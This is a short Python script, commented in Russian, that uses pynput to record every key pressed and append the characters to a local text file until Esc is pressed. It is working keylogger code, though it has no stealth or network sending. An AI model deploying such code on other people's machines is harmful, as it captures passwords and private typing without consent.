import pynput
from pynput.keyboard import Listener, Key


def press(key):
    with open("keyboard/text.txt", "a") as file:
        # Убрать кавычки из записи
        t = (str(key).replace("'", ""))
        # Писать с новой строки при пробелах
        match key:
            case Key.space:
                t = '\n'
            case Key.enter:
                t = '\n'
        # Если не нажата спец.клавиша, то вписывать буквы
        if t.find('Key') == -1:
            file.write(t)

# Прекратить работу кода
def release(key):
    if key == Key.esc:
        return False


# Читает клаву
with Listener(on_press=press, on_release=release, ) as listener:
    listener.join()  # подключение чтения
